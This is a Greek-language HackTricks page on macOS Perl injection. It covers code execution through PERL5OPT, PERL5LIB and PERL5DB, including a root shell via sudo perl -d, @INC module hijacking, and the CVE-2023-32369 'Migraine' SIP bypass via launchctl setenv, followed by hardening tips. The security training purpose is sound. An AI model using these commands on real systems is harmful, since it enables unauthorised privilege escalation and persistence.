# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Μέσω των env variables `PERL5OPT` & `PERL5LIB`

Χρησιμοποιώντας το env variable **`PERL5OPT`**, είναι δυνατό να κάνετε το **Perl** να εκτελεί αυθαίρετες εντολές κατά την εκκίνηση του interpreter (ακόμη και **πριν** γίνει parse η πρώτη γραμμή του target script).
Για παράδειγμα, δημιουργήστε αυτό το script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Τώρα **εξάγετε τη μεταβλητή env** και εκτελέστε το **perl** script:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Μια άλλη επιλογή είναι να δημιουργήσετε ένα Perl module (π.χ. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Και στη συνέχεια χρησιμοποιήστε τις μεταβλητές env, ώστε το module να εντοπίζεται και να φορτώνεται αυτόματα:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Άλλες ενδιαφέρουσες μεταβλητές περιβάλλοντος

- **`PERL5DB`** – όταν ο interpreter εκκινείται με το flag **`-d`** (debugger), το περιεχόμενο του `PERL5DB` εκτελείται ως κώδικας Perl *μέσα* στο context του debugger.
Αν μπορείτε να επηρεάσετε τόσο το environment **όσο και** τα command-line flags μιας privileged Perl process, μπορείτε να κάνετε κάτι όπως:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

- **`PERL5SHELL`** – στα Windows αυτή η μεταβλητή ελέγχει ποιο shell executable θα χρησιμοποιήσει η Perl όταν χρειάζεται να κάνει spawn ένα shell. Αναφέρεται εδώ μόνο για πληρότητα, καθώς δεν είναι σχετική με το macOS.

Παρότι το `PERL5DB` απαιτεί το switch `-d`, είναι συνηθισμένο να βρίσκει κανείς maintenance ή installer scripts που εκτελούνται ως *root* με ενεργοποιημένο αυτό το flag για verbose troubleshooting, καθιστώντας τη μεταβλητή έγκυρο escalation vector.

## Μέσω dependencies (@INC abuse)

Είναι δυνατό να εμφανίσετε το include path που θα αναζητήσει η Perl (**`@INC`**) εκτελώντας:
```bash
perl -e 'print join("\n", @INC)'
```
Η τυπική έξοδος στο macOS 13/14 μοιάζει ως εξής:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Ορισμένοι από τους φακέλους που επιστρέφονται δεν υπάρχουν καν. Ωστόσο, το **`/Library/Perl/5.30`** υπάρχει, *δεν* προστατεύεται από το SIP και βρίσκεται *πριν* από τους φακέλους που προστατεύονται από το SIP. Επομένως, αν μπορείτε να γράψετε ως *root*, μπορείτε να τοποθετήσετε ένα κακόβουλο module (π.χ. `File/Basename.pm`), το οποίο θα φορτώνεται *κατά προτεραιότητα* από οποιοδήποτε privileged script εισάγει αυτό το module.

> [!WARNING]
> Χρειάζεστε και πάλι **root** για να γράψετε μέσα στο `/Library/Perl` και το macOS θα εμφανίσει ένα prompt **TCC** που ζητά *Full Disk Access* για τη διεργασία που εκτελεί την εγγραφή.

Για παράδειγμα, αν ένα script εισάγει το **`use File::Basename;`**, θα ήταν δυνατό να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm`, το οποίο θα περιέχει κώδικα ελεγχόμενο από τον attacker.

## SIP bypass μέσω του Migration Assistant (CVE-2023-32369 “Migraine”)

Τον Μάιο του 2023, η Microsoft αποκάλυψε το **CVE-2023-32369**, με το παρατσούκλι **Migraine**, μια post-exploitation τεχνική που επιτρέπει σε έναν *root* attacker να παρακάμψει πλήρως το **System Integrity Protection (SIP)**.
Το ευάλωτο component είναι το **`systemmigrationd`**, ένα daemon με το entitlement **`com.apple.rootless.install.heritable`**. Κάθε child process που δημιουργείται από αυτό το daemon κληρονομεί το entitlement και επομένως εκτελείται *εκτός* των περιορισμών του SIP.<sup>[[1]](#references)</sup>

Μεταξύ των children που εντόπισαν οι ερευνητές είναι ο interpreter με υπογραφή από την Apple:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Επειδή το Perl τιμά το `PERL5OPT` (και το Bash τιμά το `BASH_ENV`), αρκεί η δηλητηρίαση του *περιβάλλοντος* του daemon για την απόκτηση αυθαίρετης εκτέλεσης σε πλαίσιο χωρίς SIP:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Όταν εκτελείται το `migrateLocalKDC`, το `/usr/bin/perl` ξεκινά με το κακόβουλο `PERL5OPT` και εκτελεί το `/private/tmp/migraine.sh` *πριν επανενεργοποιηθεί το SIP*. Από αυτό το script μπορείτε, για παράδειγμα, να αντιγράψετε ένα payload μέσα στο **`/System/Library/LaunchDaemons`** ή να αντιστοιχίσετε το extended attribute `com.apple.rootless`, ώστε να καταστήσετε ένα αρχείο **μη διαγράψιμο**.

Η Apple διόρθωσε το πρόβλημα στα macOS **Ventura 13.4**, **Monterey 12.6.6** και **Big Sur 11.7.7**, αλλά παλαιότερα ή μη patched συστήματα παραμένουν ευάλωτα.<sup>[[1]](#references)</sup>

## Προτάσεις Hardening

1. **Εκκαθαρίστε τις επικίνδυνες μεταβλητές** – τα privileged launchdaemons ή cron jobs θα πρέπει να ξεκινούν με καθαρό περιβάλλον (`launchctl unsetenv PERL5OPT`, `env -i`, κ.λπ.).
2. **Αποφύγετε την εκτέλεση interpreters ως root** εκτός αν είναι απολύτως απαραίτητο. Χρησιμοποιήστε compiled binaries ή κάντε drop privileges νωρίς.
3. **Συμπεριλάβετε τα scripts με `-T` (taint mode)**, ώστε η Perl να αγνοεί το `PERL5OPT` και άλλα μη ασφαλή switches όταν είναι ενεργοποιημένο το taint checking.
4. **Διατηρείτε το macOS ενημερωμένο** – το “Migraine” έχει διορθωθεί πλήρως στις τρέχουσες εκδόσεις.

## Αναφορές

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
